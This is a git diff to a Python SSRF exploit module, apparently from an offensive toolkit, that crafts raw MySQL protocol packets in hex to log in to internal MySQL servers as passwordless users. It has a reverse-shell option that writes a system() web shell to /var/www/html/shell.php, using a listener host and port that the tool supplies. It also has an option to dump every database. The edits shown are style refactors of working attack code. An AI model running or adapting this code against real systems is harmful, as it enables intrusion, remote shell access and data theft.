@@ -23,7 +23,7 @@ class exploit():
 
 
     def __init__(self, requester, args):
-        logging.info("Module '{}' launched !".format(name))
+        logging.info(f"Module '{name}' launched !")
 
         # Encode the username for the request
         self.user = input("Give MySQL username: ")
@@ -33,7 +33,8 @@ class exploit():
         length = '{:x}'.format(0xa3 + temp)
 
         # Authenticate to MySQL service - only work with users allowed without password
-        dump  = length+ "00000185a6ff0100000001210000000000000000000000000000000000000000000000"
+        dump = f"{length}00000185a6ff0100000001210000000000000000000000000000000000000000000000"
+
         dump += encode_user.decode()
         dump += "00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c"
         dump += "69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d"
@@ -44,17 +45,16 @@ class exploit():
         # Reverse shell - writing system() in /var/www/html/shell.php
         if query == "reverse":
             self.query = self.reverse
-            if args.lhost == None: 
+            if args.lhost is None: 
                 self.query = self.query.replace("SERVER_HOST", input("Server Host:"))
             else:
                 self.query = self.query.replace("SERVER_HOST", args.lhost)
 
-            if args.lport == None: 
+            if args.lport is None: 
                 self.query = self.query.replace("SERVER_PORT", input("Server Port:"))
             else:
                 self.query = self.query.replace("SERVER_PORT", args.lport)
-        
-        # Dump in one shot - extract every databases/tables/columns 
+
         elif query == "dios":
             self.query = self.dios
 
@@ -67,7 +67,7 @@ class exploit():
         gen_host = gen_ip_list("127.0.0.1", args.level)
         for ip in gen_host:
             payload = self.get_payload(self.query, auth, ip)
-            logging.info("Generated payload : {}".format(payload))
+            logging.info(f"Generated payload : {payload}")
 
             r1 = requester.do_request(args.param, payload)
             r2 = requester.do_request(args.param, "")
@@ -82,11 +82,9 @@ class exploit():
 
 
     def get_payload(self, query, auth, ip):
-        if(query.strip()!=''):
-        	query = binascii.hexlify( query.encode() )
-        	query_length = '{:x}'.format((int((len(query) / 2) + 1)))
-        	pay1 = query_length.rjust(2,'0') + "00000003" + query.decode()
-        	final = self.encode(auth + pay1 + "0100000001", ip)
-        	return final
-        else:
-    	    return self.encode(auth, ip)
+        if query.strip() == '':
+            return self.encode(auth, ip)
+        query = binascii.hexlify( query.encode() )
+        query_length = '{:x}'.format((int((len(query) / 2) + 1)))
+        pay1 = query_length.rjust(2,'0') + "00000003" + query.decode()
+        return self.encode(auth + pay1 + "0100000001", ip)
